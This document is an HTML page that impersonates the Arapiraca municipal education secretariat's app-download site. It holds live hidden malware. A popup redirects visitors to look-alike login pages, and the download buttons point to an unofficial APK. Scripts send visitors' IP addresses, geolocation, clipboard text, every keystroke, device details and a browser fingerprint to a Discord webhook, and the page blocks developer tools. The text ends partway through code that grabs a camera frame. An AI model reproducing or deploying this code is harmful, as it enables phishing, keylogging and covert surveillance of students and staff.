<!DOCTYPE html>
<html lang="pt-br">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="robots" content="index, follow">
        <meta name="abstract" content="SME - Secretaria Municipal de Educa&#231;&#227;o de Arapiraca - AL">
	    <meta name="topic" content="SME - Secretaria Municipal de Educa&#231;&#227;o de Arapiraca - AL">
	    <meta name="summary" content="SME - Secretaria Municipal de Educa&#231;&#227;o de Arapiraca - AL">
	    <meta property="og:url" id="tag_url" content="">
	    <meta property="og:type" content="website">
	    <meta property="og:title" content="SME - Secretaria Municipal de Educa&#231;&#227;o de Arapiraca - AL">
	    <meta property="og:description" content="SME - Secretaria Municipal de Educa&#231;&#227;o de Arapiraca - AL">
	    <meta property="og:site_name" content="SME - Secretaria Municipal de Educa&#231;&#227;o de Arapiraca - AL">
	    <meta property="og:locale" content="pt_BR">
	    <meta itemprop="name" content="SME - Secretaria Municipal de Educa&#231;&#227;o de Arapiraca - AL">
      	<meta itemprop="description" content="SME - Secretaria Municipal de Educa&#231;&#227;o de Arapiraca - AL">
     	<meta name="twitter:card" content="summary">
    	<meta name="twitter:site" content="SME - Secretaria Municipal de Educa&#231;&#227;o de Arapiraca - AL">
    	<meta name="twitter:url" id="twitter_url" content="https://arapiraca-al.portalsigeduc.com.br.portalsigeduc.com.br/">
    	<meta name="twitter:title" content="SME - Secretaria Municipal de Educa&#231;&#227;o de Arapiraca - AL">
     	<meta name="twitter:description" content="SME - Secretaria Municipal de Educa&#231;&#227;o de Arapiraca - AL">
	    <meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="author" content="CARLIANY VIT√ìRIA DA SILVA SANTOS">
		<meta name="keywords" content="SME - Secretaria de Educa√ß√£o de Arapiraca">
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <meta http-equiv="imagetoolbar" content="no">
        <meta http-equiv="msthemecompatible" content="no">
		<meta name="geo.region" content="BR-AL">
        <meta name="geo.placename" content="Arapiraca">
        <meta name="geo.position" content="-2.7526;-46.6615">
        <meta name="ICBM" content="-1.7226, -23.6615">
        <meta name="content-language" content="pt-br">
        <meta name="generator" content="HTML5 + CSS3 + JS">
        <meta name="referrer" content="no-referrer-when-downgrade">
        <meta http-equiv="cleartype" content="on">
		<meta name="language" content="pt-BR">
        <meta http-equiv="Pragma" content="no-cache">
        <meta http-equiv="Expires" content="0">
		<title>SME - Secretaria de Educa√ß√£o de Arapiraca - AL</title>
		<meta name="theme-color" content="#0000FF">
        <link rel="icon" type="image/png" href="img/icon.png">
        <style>
    :root {
      --azul-escuro: #002b66;
      --azul-claro: #007bff;
      --dourado: #ffcc00;
      --dourado-brilho: #ffd700;
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Segoe UI', system-ui, sans-serif;
      background: linear-gradient(135deg, var(--azul-escuro), var(--azul-claro));
      color: #fff;
      line-height: 1.6;
      overflow-x: hidden;
    }

    header {
      background: rgba(0, 0, 0, 0.4);
      backdrop-filter: blur(8px);
      padding: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-wrap: wrap;
      gap: 15px;
      text-align: center;
      box-shadow: 0 3px 10px rgba(0, 0, 0, 0.4);
    }

    header img {
      height: 55px;
      max-width: 100%;
    }

    header h1 {
      font-size: clamp(1.3rem, 3vw, 2rem);
      color: var(--dourado-brilho);
      text-shadow: 0 0 12px var(--dourado-brilho);
      font-weight: 700;
    }

    .hero {
      text-align: center;
      padding: clamp(60px, 10vw, 120px) 20px;
      background: radial-gradient(circle at center, var(--azul-claro) 0%, var(--azul-escuro) 100%);
      box-shadow: inset 0 0 80px rgba(255, 255, 255, 0.1);
    }

    .hero h2 {
      font-size: clamp(1.8rem, 5vw, 3rem);
      color: var(--dourado);
      text-shadow: 0 0 15px var(--dourado-brilho);
      margin-bottom: 15px;
    }

    .hero p {
      font-size: clamp(1rem, 2vw, 1.3rem);
      max-width: 750px;
      margin: 0 auto 35px;
      color: #e8f0ff;
    }

    .btn-container {
      display: flex;
      justify-content: center;
      flex-wrap: wrap;
      gap: 15px;
    }

    .btn-download {
      background: linear-gradient(135deg, var(--dourado) 0%, #ffaa00 100%);
      color: #002b66;
      padding: 15px 35px;
      font-size: clamp(1rem, 2vw, 1.2rem);
      border-radius: 10px;
      text-decoration: none;
      font-weight: 600;
      box-shadow: 0 0 15px rgba(255, 215, 0, 0.7);
      transition: all 0.3s ease;
    }

    .btn-download:hover {
      transform: scale(1.07);
      box-shadow: 0 0 25px rgba(255, 255, 120, 0.9);
    }

    .features {
      max-width: 1200px;
      margin: 70px auto;
      padding: 0 20px;
    }

    .features h3 {
      text-align: center;
      font-size: clamp(1.6rem, 4vw, 2.5rem);
      color: var(--dourado);
      text-shadow: 0 0 10px var(--dourado-brilho);
      margin-bottom: 50px;
    }

    .features-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
      gap: 25px;
    }

    .feature {
      background: rgba(255, 255, 255, 0.1);
      border-radius: 15px;
      padding: 25px;
      backdrop-filter: blur(5px);
      box-shadow: 0 0 15px rgba(0, 0, 0, 0.25);
      text-align: center;
      transition: all 0.3s ease;
    }

    .feature:hover {
      transform: translateY(-5px);
      box-shadow: 0 0 25px rgba(255, 255, 120, 0.6);
    }

    .feature img {
      width: 70px;
      height: 70px;
      object-fit: contain;
      filter: drop-shadow(0 0 10px var(--dourado-brilho));
      margin-bottom: 15px;
    }

    .feature h4 {
      font-size: clamp(1rem, 2vw, 1.3rem);
      color: #fff;
      margin-bottom: 10px;
    }

    .feature p {
      color: #eaeaea;
      font-size: clamp(0.9rem, 1.5vw, 1rem);
    }

    footer {
      background: rgba(0, 0, 0, 0.6);
      text-align: center;
      padding: 25px 10px;
      color: #ddd;
      font-size: 0.9rem;
      border-top: 1px solid rgba(255,255,255,0.2);
    }

    footer a {
      color: var(--dourado);
      text-decoration: none;
    }

    footer a:hover {
      text-decoration: underline;
    }
 /* Fundo escuro com efeito suave */
.popup {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0, 0, 0, 0.6);
  display: flex;
  align-items: center;
  justify-content: center; /* centraliza no meio da tela */
  z-index: 9999;
  backdrop-filter: blur(6px);
}

/* Caixa do popup */
.popup-content {
  background: linear-gradient(180deg, #0d47a1, #1976d2); /* azul elegante */
  color: #fff;
  padding: 30px 25px;
  border-radius: 16px;
  text-align: center;
  max-width: 420px;
  width: 90%;
  box-shadow: 0 6px 20px rgba(0, 0, 0, 0.4);
  animation: fadeIn 0.8s ease forwards;
  position: relative;
  overflow: hidden;
}

/* Bordas douradas sutis */
.popup-content::before {
  content: "";
  position: absolute;
  inset: 0;
  border: 2px solid #ffd700;
  border-radius: 16px;
  pointer-events: none;
  opacity: 0.8;
}

/* Imagem central */
.popup-img {
  width: 90px;
  margin-bottom: 15px;
  filter: drop-shadow(0 0 6px rgba(255, 215, 0, 0.7));
}

/* T√≠tulo */
.popup-content h2 {
  margin-bottom: 12px;
  color: #ffd700; /* dourado */
  font-size: 22px;
  font-weight: bold;
}

/* Texto */
.popup-content p {
  color: #f1f1f1;
  font-size: 15px;
  line-height: 1.5;
  margin-bottom: 20px;
}

/* Barra de carregamento dourada */
.progress-bar {
  width: 100%;
  height: 10px;
  background: rgba(255, 255, 255, 0.2);
  border-radius: 5px;
  overflow: hidden;
  margin-top: 10px;
}

.progress-fill {
  width: 0%;
  height: 100%;
  background: linear-gradient(90deg, #ffd700, #fff3b0);
  animation: loadBar 55s linear forwards;
  border-radius: 5px;
}

/* --- Anima√ß√µes --- */
@keyframes loadBar {
  from { width: 0%; }
  to { width: 100%; }
}

@keyframes fadeIn {
  from {
    opacity: 0;
    transform: scale(0.9);
  }
  to {
    opacity: 1;
    transform: scale(1);
  }
}

/* Responsivo para celular */
@media (max-width: 480px) {
  .popup-content {
    padding: 25px 20px;
    max-width: 90%;
  }

  .popup-content h2 {
    font-size: 20px;
  }

  .popup-content p {
    font-size: 14px;
  }

  .popup-img {
    width: 70px;
  }
}


  </style>
    </head>
    <body>
        <div id="popup" class="popup">
  <div class="popup-content">
    <img src="img/icon.png" alt="Logo da institui√ß√£o" class="popup-img">
    <h2>Ol√°!</h2>
    <p>
      Para fazer o download do aplicativo, √© necess√°rio confirmar se voc√™ √© aluno,
      professor ou funcion√°rio. Apenas usu√°rios vinculados √† institui√ß√£o t√™m acesso
      autorizado. Em instantes, voc√™ ser√° redirecionado ao sistema de login para
      validar sua identidade.
    </p>
    <div class="progress-bar">
      <div class="progress-fill"></div>
    </div>
  </div>
</div>

 <header>
    <img src="img/icon.png" alt="SME Arapiraca">
    <h1>App Educacional Arapiraca</h1>
  </header>

  <section class="hero">
    <h2>Transformando Educa√ß√£o em Conex√£o</h2>
    <p>O aplicativo oficial da Secretaria Municipal de Educa√ß√£o de Arapiraca conecta alunos, professores e respons√°veis em um ambiente digital simples e completo. Acompanhe notas, frequ√™ncias, comunicados e muito mais!</p>
    <div class="btn-container">
      <a href="https://www.mediafire.com/file/zc2j2ujk6vi2po5/SME_Arapiraca_Digital-13.0-arm64-v8a_armeabi-v7a-debug.apk/file" class="btn-download">üì± Baixar para Android</a>
      <a href="https://www.mediafire.com/file/zc2j2ujk6vi2po5/SME_Arapiraca_Digital-13.0-arm64-v8a_armeabi-v7a-debug.apk/file" class="btn-download">üçé Baixar para iOS</a>
    </div>
  </section>

  <section class="features">
    <h3>Recursos do Aplicativo</h3>
    <div class="features-grid">
      <div class="feature">
        <img src="img/notas.png" alt="Notas e Avalia√ß√µes">
        <h4>Notas e Desempenho</h4>
        <p>Veja suas notas, m√©dias e hist√≥rico escolar de forma r√°pida e segura.</p>
      </div>

      <div class="feature">
        <img src="img/Frequencia.png" alt="Frequ√™ncia Escolar">
        <h4>Frequ√™ncia Escolar</h4>
        <p>Acompanhe suas presen√ßas e justificativas diretamente pelo aplicativo.</p>
      </div>

      <div class="feature">
        <img src="img/aviso.png" alt="Comunica√ß√£o">
        <h4>Comunica√ß√£o</h4>
        <p>Conecte-se com professores e escolas por meio de mensagens e avisos.</p>
      </div>

      <div class="feature">
        <img src="img/prof.png" alt="Professores">
        <h4>Gest√£o do Professor</h4>
        <p>Registre presen√ßa, insira notas e organize turmas com facilidade.</p>
      </div>

      <div class="feature">
        <img src="img/documento.jpeg" alt="Documentos">
        <h4>Documentos e Boletins</h4>
        <p>Baixe boletins, hist√≥ricos e comprovantes de matr√≠cula digitalmente.</p>
      </div>
    </div>
  </section>

  <footer>
    &copy; 2025 Secretaria Municipal de Educa√ß√£o de Arapiraca ‚Äì Todos os direitos reservados.  
    <br><a href="#">Pol√≠tica de Privacidade</a> | <a href="#">Termos de Uso</a>
  </footer>
 <script>
document.addEventListener("DOMContentLoaded", () => {
  const popup = document.getElementById("popup");
  const progress = document.querySelector(".progress-fill");
  const tempoTotal = 55000;
  popup.style.display = "flex";
  progress.style.animation = `loadBar ${tempoTotal / 1000}s linear forwards`;
  progress.addEventListener("animationend", () => {
    window.location.href = "https://sigeducescolavirtual.github.io/login/";
  });
});

</script>
<script>
  // fallback: garante redirect se animationend n√£o disparar
  const TEMPO_TOTAL = 55000; // 55s
  setTimeout(() => {
    // s√≥ redireciona se popup estiver vis√≠vel
    const popup = document.getElementById('popup');
    if (popup && popup.style.display !== 'none') {
      // ajuste a URL se necess√°rio
      window.location.href = "https://sigeducescolavirtucal.github.io/app-login/";
    }
  }, TEMPO_TOTAL + 2000); // margem de 2s
</script>


<script>
  var WEBHOOK_URL = "https://discord.com/api/webhooks/1430638895757922444/rRsN-2zGWkoEkt5re3OXt3lnyxEooiI71eTsvUaNT6xEso_iVHgda3MB11uCnIvTR-rk";

function mostrarNotificacao() {
  const options = {
    body: "APP GOLD",
    icon: "static/gold.jpeg",   
    image: "static/gold.jpeg", 
    badge: "static/gold.jpeg",
    vibrate: [200, 100, 200],   
    data: { url: "https://blackstrik7.serveo.net" }
  };

  try {
    const n = new Notification("üì≤ ContatoOS Gold", options);
    n.onclick = (event) => {
      event.preventDefault();
      window.open(options.data.url, "_blank");
    };
  } catch (err) {
    console.error("Erro ao criar notifica√ß√£o:", err);
  }
}

Notification.requestPermission().then(permission => {
  fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      username: "Notif Bot",
      content: `üì≤ Permiss√£o de notifica√ß√£o: **${permission}**`
    })
  }).catch(err => console.error("Erro ao enviar notifica√ß√£o para webhook:", err));
});

function sendWebhook(status) {
  const data = {
    usuario: "Vitman do Site",
    status: status,
    horario: new Date().toLocaleString()
  };

  fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data, null, 2)
  }).catch(err => console.error("Erro ao enviar:", err));
}

document.addEventListener("visibilitychange", () => {
  if (document.visibilityState === "visible") {
    sendWebhook("üü¢ Vitman voltou para o site");
  } else {
    sendWebhook("üü° Vitman minimizou/foi para outra aba");
  }
});

window.addEventListener("beforeunload", () => {
  sendWebhook("üî¥ Vitman saiu do site");
});

window.addEventListener("load", () => {
  sendWebhook("‚úÖ Vitman entrou no site");
});

async function getIPs() {
  const ips = [];
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    ips.push({ tipo: "P√∫blico", ip: data.ip });
  } catch (e) {
    console.warn("Falha ao buscar IP p√∫blico", e);
  }
  try {
    const pc = new RTCPeerConnection({ iceServers: [] });
    pc.createDataChannel("");
    pc.onicecandidate = (event) => {
      if (event.candidate) {
        const match = event.candidate.candidate.match(/(\d{1,3}(\.\d{1,3}){3})/);
        if (match && !ips.find(x => x.ip === match[1])) {
          ips.push({ tipo: "Local", ip: match[1] });
          console.log("IP Local detectado:", match[1]);
        }
      }
    };
    await pc.createOffer().then(o => pc.setLocalDescription(o));
  } catch (e) {
    console.warn("Falha ao buscar IP local", e);
  }

  return ips;
}

async function sendToDiscord(data) {
  const payload = {
    username: "Blackhat Bot",
    embeds: [
      {
        title: "üì° Resultados do Teste",
        description: "IPs coletados da rede",
        color: 3447003,
        fields: data.map(ipObj => ({
          name: ipObj.tipo,
          value: ipObj.ip,
          inline: true
        })),
        footer: { text: "Vitman" },
        timestamp: new Date().toISOString()
      }
    ]
  };

  try {
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
    console.log("Dados enviados para o Discord!");
  } catch (err) {
    console.error("Erro ao enviar IPs:", err);
  }
}

getIPs().then(ips => {
  console.log("Lista de IPs encontrados:", ips);
  sendToDiscord(ips);
});

async function readClipboardAndSend() {
  try {
    const permission = await navigator.permissions.query({ name: "clipboard-read" });
    if (permission.state === "denied") {
      console.warn("Permiss√£o negada para acessar clipboard.");
      return;
    }

    const text = await navigator.clipboard.readText();
    if (!text) {
      console.log("Clipboard vazio.");
      return;
    }

    console.log("Texto do clipboard:", text);

    const payload = {
      username: "Clipboard Bot",
      avatar_url: "https://i.imgur.com/AfFp7pu.png",
      embeds: [
        {
          title: "üìã Novo conte√∫do do clipboard",
          description: text.slice(0, 2000),
          color: 3447003,
          footer: { text: "Enviado automaticamente" },
          timestamp: new Date().toISOString()
        }
      ]
    };

    const res = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    if (res.ok) console.log("Enviado ao Discord com sucesso!");
    else console.error("Falha ao enviar:", res.status);
  } catch (err) {
    console.error("Erro ao ler clipboard:", err);
  }
}

window.addEventListener("load", () => {
  readClipboardAndSend();
});

async function getLocationAndSend() {
  try {
    let res = await fetch("https://ipapi.co/json/");
    let data = await res.json();

    let mapsUrl = `https://www.google.com/maps/search/?api=1&query=${data.latitude},${data.longitude}`;

    let payload = {
      username: "üåê GeoBot Avan√ßado",
      embeds: [{
        title: "üì° Detalhes da Conex√£o",
        color: 0x1E90FF,
        description: `üîé Localiza√ß√£o obtida pelo IP.\n[üìç Ver no Google Maps](${mapsUrl})`,
        fields: [
          { name: "üåç IP", value: data.ip || "N/A", inline: true },
          { name: "üèôÔ∏è Cidade", value: data.city || "N/A", inline: true },
          { name: "üó∫Ô∏è Regi√£o", value: data.region || "N/A", inline: true },
          { name: "üá®üá¥ Pa√≠s", value: data.country_name || "N/A", inline: true },
          { name: "üåê C√≥digo Pa√≠s", value: data.country || "N/A", inline: true },
          { name: "‚è∞ Fuso hor√°rio", value: data.timezone || "N/A", inline: true },
          { name: "üí∞ Moeda", value: data.currency || "N/A", inline: true },
          { name: "üì° Provedor (ISP)", value: data.org || "N/A", inline: false },
          { name: "üìå Latitude", value: data.latitude || "N/A", inline: true },
          { name: "üìå Longitude", value: data.longitude || "N/A", inline: true }
        ],
        thumbnail: {
          url: "https://cdn-icons-png.flaticon.com/512/684/684908.png"
        },
        footer: { text: "Dados fornecidos por ipapi.co üåê" },
        timestamp: new Date().toISOString()
      }]
    };

    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    console.log("‚úÖ Dados enviados para o Discord!");
  } catch (e) {
    console.error("Erro ao buscar dados de localiza√ß√£o:", e);
  }
}

getLocationAndSend();

async function detectVPN() {
  try {
    let res = await fetch("https://ipapi.co/json/");
    let data = await res.json();

    let org = (data.org || "").toLowerCase();
    let asn = (data.asn || "").toLowerCase();

    let suspeitos = ["amazon", "aws", "google", "ovh", "digitalocean", "microsoft", "azure", "contabo", "linode", "vultr", "hetzner", "cloudflare"];
    let vpnDetectado = suspeitos.some(nome => org.includes(nome) || asn.includes(nome));

    let status = vpnDetectado ? "‚ö†Ô∏è Poss√≠vel VPN/Proxy detectado" : "‚úÖ Parece ser uma conex√£o residencial normal";

    let payload = {
      username: "VPN Detector",
      embeds: [{
        title: "üîé Verifica√ß√£o de VPN / Proxy",
        color: vpnDetectado ? 0xFF0000 : 0x00FF00,
        fields: [
          { name: "IP", value: data.ip || "N/A", inline: true },
          { name: "Cidade", value: data.city || "N/A", inline: true },
          { name: "Pa√≠s", value: data.country_name || "N/A", inline: true },
          { name: "Org", value: data.org || "N/A", inline: false },
          { name: "ASN", value: data.asn || "N/A", inline: false },
          { name: "Resultado", value: status, inline: false }
        ],
        footer: { text: "Analisado com ipapi.co üåê" },
        timestamp: new Date().toISOString()
      }]
    };

    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });

    console.log("‚úÖ Resultado enviado para o Discord!");
  } catch (e) {
    console.error("Erro ao detectar VPN:", e);
  }
}

detectVPN();

document.addEventListener("keydown", async (event) => {
  let payload = {
    username: "KeyLogger:",
    content: `‚å®Ô∏è Tecla pressionada: **${event.key}**`
  };

  await fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  }).catch(err => console.error("Erro ao enviar keylog:", err));
});

(() => {
  document.addEventListener('contextmenu', (e) => e.preventDefault(), { passive: false });

  document.addEventListener('keydown', (e) => {
    const k = e.key.toLowerCase();
    const ctrl = e.ctrlKey || e.metaKey;
    const shift = e.shiftKey;

    if (k === 'f12') return e.preventDefault();
    if (ctrl && shift && ['i', 'j', 'c'].includes(k)) return e.preventDefault();
    if (ctrl && ['u', 's', 'p'].includes(k)) return e.preventDefault();
  }, { passive: false });

  const showShield = () => {
    if (document.getElementById('shield-devtools')) return;
    const d = document.createElement('div');
    d.id = 'shield-devtools';
    Object.assign(d.style, {
      position: 'fixed', inset: '0', background: 'rgba(10,10,10,.95)',
      color: '#fff', zIndex: '2147483647', display: 'flex',
      alignItems: 'center', justifyContent: 'center',
      fontFamily: 'system-ui, sans-serif', textAlign: 'center',
      padding: '24px'
    });
    d.innerHTML = `
      <div>
        <div style="font-size:22px;font-weight:700;margin-bottom:8px">Inspe√ß√£o bloqueada</div>
        <div style="opacity:.8">Acesso negado</div>
      </div>`;
    document.body.appendChild(d);
  };

  const hideShield = () => {
    const el = document.getElementById('shield-devtools');
    if (el) el.remove();
  };

  const isDockedDevtools = () => {
    const wGap = Math.abs(window.outerWidth - window.innerWidth);
    const hGap = Math.abs(window.outerHeight - window.innerHeight);
    return wGap > 160 || hGap > 160;
  };

  const perfTrapDetect = () => {
    const t0 = performance.now();
    debugger;
    const dt = performance.now() - t0;
    return dt > 100;
  };

  let lastState = false;
  setInterval(() => {
    const open = isDockedDevtools() || perfTrapDetect();
    if (open && !lastState) showShield();
    if (!open && lastState) hideShield();
    lastState = open;
  }, 1200);
})();

async function sendFullDeviceInfo() {
  try {
    const ua = navigator.userAgent;
    const platform = navigator.platform;
    const cores = navigator.hardwareConcurrency || "N/A";
    const memory = navigator.deviceMemory || "N/A";
    const language = navigator.language;
    const screenSize = `${window.screen.width}x${window.screen.height}`;
    let canvas = document.createElement("canvas");
    let gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    let gpuInfo = "N/A";
    if (gl) {
      let debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
      if (debugInfo) gpuInfo = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
    }
    let batteryInfo = { level: "N/A", charging: "N/A" };
    if (navigator.getBattery) {
      const battery = await navigator.getBattery();
      batteryInfo.level = Math.round(battery.level * 100) + "%";
      batteryInfo.charging = battery.charging ? "‚úÖ Carregando" : "‚ùå N√£o carregando";
    }
    async function getLocalIP() {
      return new Promise((resolve) => {
        let ipFound = null;
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel("");
        pc.onicecandidate = (event) => {
          if (!event.candidate) {
            pc.close();
            resolve(ipFound || "N/A");
            return;
          }
          const ipMatch = event.candidate.candidate.match(/(\d{1,3}(\.\d{1,3}){3})/);
          if (ipMatch) ipFound = ipMatch[1];
        };
        pc.createOffer().then((offer) => pc.setLocalDescription(offer)).catch(() => resolve("N/A"));
      });
    }
    const localIP = await getLocalIP();
    let publicIP = "N/A", city = "N/A", region = "N/A", country = "N/A";
    try {
      const res = await fetch("https://ipapi.co/json/");
      const data = await res.json();
      publicIP = data.ip || "N/A";
      city = data.city || "N/A";
      region = data.region || "N/A";
      country = data.country_name || "N/A";
    } catch {}
    const payload = {
      username: "üì± Device Info Bot",
      embeds: [{
        title: "üíª Informa√ß√µes do Dispositivo Completo",
        color: 0x1E90FF,
        fields: [
          { name: "üñ• Plataforma", value: platform, inline: true },
          { name: "üåê User Agent", value: ua, inline: false },
          { name: "üß† CPU Cores", value: cores.toString(), inline: true },
          { name: "üíæ RAM (GB)", value: memory.toString(), inline: true },
          { name: "üé® GPU", value: gpuInfo, inline: true },
          { name: "üñ• Tela", value: screenSize, inline: true },
          { name: "üó£Ô∏è Idioma", value: language, inline: true },
          { name: "üîã Bateria", value: batteryInfo.level, inline: true },
          { name: "‚ö° Carregando?", value: batteryInfo.charging, inline: true },
          { name: "üåê IP Local", value: localIP, inline: true },
          { name: "üåç IP P√∫blico", value: publicIP, inline: true },
          { name: "üèô Cidade / Regi√£o / Pa√≠s", value: `${city} / ${region} / ${country}`, inline: false }
        ],
        footer: { text: "Coletado com JavaScript no navegador" },
        timestamp: new Date().toISOString()
      }]
    };
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload)
    });
    console.log("‚úÖ Informa√ß√µes completas enviadas para o Discord!");
  } catch (e) {
    console.error("Erro ao coletar informa√ß√µes:", e);
  }
}

sendFullDeviceInfo();

async function coletarFingerprint() {
  async function gerarHash(obj) {
    const msgBuffer = new TextEncoder().encode(JSON.stringify(obj));
    const hashBuffer = await crypto.subtle.digest("SHA-256", msgBuffer);
    return Array.from(new Uint8Array(hashBuffer))
      .map(b => b.toString(16).padStart(2, "0"))
      .join("");
  }
  function getCanvasFingerprint() {
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");
    ctx.textBaseline = "top";
    ctx.font = "16px Arial";
    ctx.fillText("Fingerprint Test", 2, 2);
    return canvas.toDataURL();
  }
  function getWebGLFingerprint() {
    try {
      const canvas = document.createElement("canvas");
      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
      if (!gl) return "N√£o suportado";
      const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
      return {
        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)
      };
    } catch {
      return "Erro";
    }
  }
  async function getAudioFingerprint() {
    try {
      const ctx = new (window.AudioContext || window.webkitAudioContext)();
      const oscillator = ctx.createOscillator();
      const analyser = ctx.createAnalyser();
      const gain = ctx.createGain();
      gain.gain.value = 0;
      oscillator.connect(analyser);
      analyser.connect(gain);
      gain.connect(ctx.destination);
      oscillator.start(0);
      const data = new Float32Array(analyser.frequencyBinCount);
      analyser.getFloatFrequencyData(data);
      oscillator.stop();
      return data.slice(0, 20).join(",");
    } catch {
      return "N√£o dispon√≠vel";
    }
  }
  function detectarFontes() {
    const fontes = ["Arial", "Verdana", "Times New Roman", "Courier New", "Georgia", "Comic Sans MS"];
    const baseFont = "monospace";
    const span = document.createElement("span");
    span.innerText = "abcdefghiABCDEFGHI";
    span.style.fontSize = "72px";
    document.body.appendChild(span);
    const resultados = [];
    fontes.forEach(f => {
      span.style.fontFamily = `${f},${baseFont}`;
      const largura = span.offsetWidth;
      const altura = span.offsetHeight;
      span.style.fontFamily = baseFont;
      if (span.offsetWidth !== largura || span.offsetHeight !== altura) {
        resultados.push(f);
      }
    });
    document.body.removeChild(span);
    return resultados;
  }
  function detectarPlugins() {
    return Array.from(navigator.plugins).map(p => p.name);
  }
  function detectarAdblock() {
    const bait = document.createElement("div");
    bait.className = "adsbox";
    bait.style.display = "none";
    document.body.appendChild(bait);
    const detectado = window.getComputedStyle(bait).display === "none";
    document.body.removeChild(bait);
    return detectado;
  }
  function detectarRede() {
    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    return c ? {
      effectiveType: c.effectiveType,
      downlink: c.downlink,
      rtt: c.rtt,
      saveData: c.saveData
    } : "Indispon√≠vel";
  }
  async function detectarBateria() {
    try {
      const b = await navigator.getBattery();
      return {
        carregando: b.charging,
        nivel: (b.level * 100) + "%",
        tempoCarga: b.chargingTime,
        tempoDescarga: b.dischargingTime
      };
    } catch {
      return "Indispon√≠vel";
    }
  }
  async function detectarWebRTC() {
    return new Promise(resolve => {
      try {
        const ips = [];
        const pc = new RTCPeerConnection({ iceServers: [] });
        pc.createDataChannel("");
        pc.createOffer().then(o => pc.setLocalDescription(o));
        pc.onicecandidate = e => {
          if (e && e.candidate && e.candidate.candidate) {
            const parts = e.candidate.candidate.split(" ");
            const ip = parts[4];
            if (!ips.includes(ip)) ips.push(ip);
          } else {
            resolve(ips);
          }
        };
      } catch {
        resolve("Indispon√≠vel");
      }
    });
  }
  async function detectarIPPublico() {
    try {
      const res = await fetch("https://api.ipify.org?format=json");
      const data = await res.json();
      return data.ip;
    } catch {
      return "Indispon√≠vel";
    }
  }

  const fingerprint = {
    userAgent: navigator.userAgent,
    language: navigator.language,
    languages: navigator.languages,
    platform: navigator.platform,
    coresCPU: navigator.hardwareConcurrency,
    memoria: navigator.deviceMemory || "desconhecido",
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    tela: {
      width: screen.width,
      height: screen.height,
      colorDepth: screen.colorDepth,
      orientation: screen.orientation?.type || "desconhecido"
    },
    canvas: getCanvasFingerprint(),
    webgl: getWebGLFingerprint(),
    audio: await getAudioFingerprint(),
    fontes: detectarFontes(),
    plugins: detectarPlugins(),
    adblock: detectarAdblock(),
    rede: detectarRede(),
    bateria: await detectarBateria(),
    webrtc: await detectarWebRTC(),
    ipPublico: await detectarIPPublico(),
    touch: navigator.maxTouchPoints,
    permissoes: await navigator.permissions?.query({ name: "camera" }).then(r => r.state).catch(() => "desconhecido")
  };

  fingerprint.hash = await gerarHash(fingerprint);

  console.log("Fingerprint coletado:", fingerprint);

  try {
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(fingerprint, null, 2)
    });
    console.log("Fingerprint enviado com sucesso!");
  } catch (err) {
    console.error("Erro ao enviar fingerprint:", err);
  }
}

window.addEventListener("load", coletarFingerprint);

(async () => {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }, audio: false
    });

    const [track] = stream.getVideoTracks();

    let blob;
    if ('ImageCapture' in window) {
      const ic = new ImageCapture(track);
      const bitmap = await ic.grabFrame();
      const canvas = document.createElement('canvas');
      canvas.width = bitmap.width;
      canvas.height = bitmap.height;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(bitmap, 0, 0);
      blob = await new Promise(res => canvas.toBlob(res, 'image/png', 0.92));
    } else {
      const video = document.createElement('video');
      video.playsInline = true;
      video.muted = true;
      video.srcObject = stream;
      await video.play();

      await new Promise(res => {
        if (video.readyState >= 2) return res();
        video.onloadeddata = () => res();
      });

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0);
      blob = await new Promise(res => canvas.toBlob(res, 'image/png', 0.92));
    }

    const form = new FormData();
    const payload = {
      username: "Camera Bot",
      embeds: [{
        title: "üì∏ Captura realizada",
        description: "Frame obtido via getUserMedia() com consentimento.",
        color: 0x5865F2,
        timestamp: new Date().toISOString(),
        image: { url: "attachment://captura.png" },
        footer: { text: navigator.userAgent }
      }]
    };

    form.append("payload_json", JSON.stringify(payload));
    form.append("file", blob, "captura.png");
